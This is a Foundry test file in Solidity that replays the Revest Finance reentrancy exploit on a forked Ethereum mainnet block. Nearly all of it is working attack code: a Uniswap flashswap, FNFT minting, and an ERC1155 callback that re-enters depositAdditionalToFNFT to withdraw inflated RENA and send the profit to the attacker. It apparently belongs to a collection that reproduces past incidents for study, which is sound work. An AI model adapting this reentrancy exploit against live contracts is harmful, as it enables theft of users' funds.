// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";

// Universal Smart Contract Registry where any address can register which interface it supports
// https://eips.ethereum.org/EIPS/eip-1820
interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IRevest {
    event FNFTTimeLockMinted(
        address indexed asset,
        address indexed from,
        uint indexed fnftId,
        uint endTime,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTValueLockMinted(
        address indexed primaryAsset,
        address indexed from,
        uint indexed fnftId,
        address compareTo,
        address oracleDispatch,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTAddressLockMinted(
        address indexed asset,
        address indexed from,
        uint indexed fnftId,
        address trigger,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTWithdrawn(
        address indexed from,
        uint indexed fnftId,
        uint indexed quantity
    );

    event FNFTSplit(
        address indexed from,
        uint[] indexed newFNFTId,
        uint[] indexed proportions,
        uint quantity
    );

    event FNFTUnlocked(
        address indexed from,
        uint indexed fnftId
    );

    event FNFTMaturityExtended(
        address indexed from,
        uint indexed fnftId,
        uint indexed newExtendedTime
    );

    event FNFTAddionalDeposited(
        address indexed from,
        uint indexed newFNFTId,
        uint indexed quantity,
        uint amount
    );

    struct FNFTConfig {
        address asset; // The token being stored
        address pipeToContract; // Indicates if FNFT will pipe to another contract
        uint depositAmount; // How many tokens
        uint depositMul; // Deposit multiplier
        uint split; // Number of splits remaining
        uint depositStopTime; //
        bool maturityExtension; // Maturity extensions remaining
        bool isMulti; //
        bool nontransferrable; // False by default (transferrable) //
    }

    // Refers to the global balance for an ERC20, encompassing possibly many FNFTs
    struct TokenTracker {
        uint lastBalance;
        uint lastMul;
    }

    enum LockType {
        DoesNotExist,
        TimeLock,
        ValueLock,
        AddressLock
    }

    struct LockParam {
        address addressLock;
        uint timeLockExpiry;
        LockType lockType;
        ValueLock valueLock;
    }

    struct Lock {
        address addressLock;
        LockType lockType;
        ValueLock valueLock;
        uint timeLockExpiry;
        uint creationTime;
        bool unlocked;
    }

    struct ValueLock {
        address asset;
        address compareTo;
        address oracle;
        uint unlockValue;
        bool unlockRisingEdge;
    }

    function mintTimeLock(
        uint endTime,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function mintValueLock(
        address primaryAsset,
        address compareTo,
        uint unlockValue,
        bool unlockRisingEdge,
        address oracleDispatch,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function withdrawFNFT(uint tokenUID, uint quantity) external;

    function unlockFNFT(uint tokenUID) external;

    function splitFNFT(
        uint fnftId,
        uint[] memory proportions,
        uint quantity
    ) external returns (uint[] memory newFNFTIds);

    function depositAdditionalToFNFT(
        uint fnftId,
        uint amount,
        uint quantity
    ) external returns (uint);

    function setFlatWeiFee(uint wethFee) external;

    function setERC20Fee(uint erc20) external;

    function getFlatWeiFee() external returns (uint);

    function getERC20Fee() external returns (uint);


}

contract Exploit_RevestFinance is TestHarness {
    IUniswapV2Pair internal renaWethPair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);

    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IRevest internal revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
    IERC20 internal rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);

    address internal constant attacker = 0xef967ECE5322c0D7d26Dab41778ACb55CE5Bd58B;

    uint256 reentrancyStep = 0;
    uint256 currentId;

    function setUp() external {
        cheat.createSelectFork("mainnet", 14465356); // We pin one block before the exploit happened.

        cheat.label(attacker, "Attacker");
    }

    function test_attack() public {
        // 1: Sets the interface in the Universal Registry
        // keccak256("ERC777TokensSender")
        bytes32 interfaceHash = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
        interfaceRegistry.setInterfaceImplementer(address(this), interfaceHash, address(this));

        // 2: Gives allowance to Revest
        rena.approve(address(revest), type(uint256).max);

        // 3: Flashswap Rena from pair by sending non-zero data.
        renaWethPair.swap(2000000000000000000, 0,  address(this), abi.encode(0x78));

    }

    function uniswapV2Call(address , uint amount0, uint , bytes calldata ) external  {
        require(address(renaWethPair) == msg.sender, "Only callable by pair");

          address[] memory _recipients = new address[](1);
        _recipients[0] = address(this);

        uint256[] memory _quantities = new uint256[](1);
        _quantities[0] = 2;

        IRevest.FNFTConfig memory nftConfig;
        nftConfig.asset = address(rena);
        nftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
        nftConfig.depositAmount = 0;
        nftConfig.depositMul = 0;
        nftConfig.split = 0;
        nftConfig.depositStopTime = 0;
        nftConfig.maturityExtension = false;
        nftConfig.isMulti = true;
        nftConfig.nontransferrable = false;


        // 4. Calls mintAddressLock to get 2 NFTS in order to get the current NFT id
        currentId = revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);

        // 4. Calls mintAddressLock again
        _quantities[0] = 360_000;
        revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);

        // 5. Cashout the NFTs for RENA
        revest.withdrawFNFT(currentId + 1, 360001);

        rena.transfer(address(renaWethPair), ((((amount0 / 997) * 1000) / 99) * 100) + 1000);

        uint256 renaEndingBalance = rena.balanceOf(address(this));
        emit log_named_decimal_uint("Rena Ending Profit", renaEndingBalance, 18);
        rena.transfer(attacker, renaEndingBalance);
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 id,
        uint256 ,
        bytes calldata 
    ) public returns (bytes4) {
        // Checking that the current minted ID is the next one to ensure that we mint all the NFTs of that ID
        if (id == currentId + 1 && (reentrancyStep == 0)) { // Using a reentrancyStep as a number allows us to perform different logics depending on the current callback step.
            reentrancyStep++;
            revest.depositAdditionalToFNFT(currentId, 1e18, 1);
        }
        return this.onERC1155Received.selector;
    }

}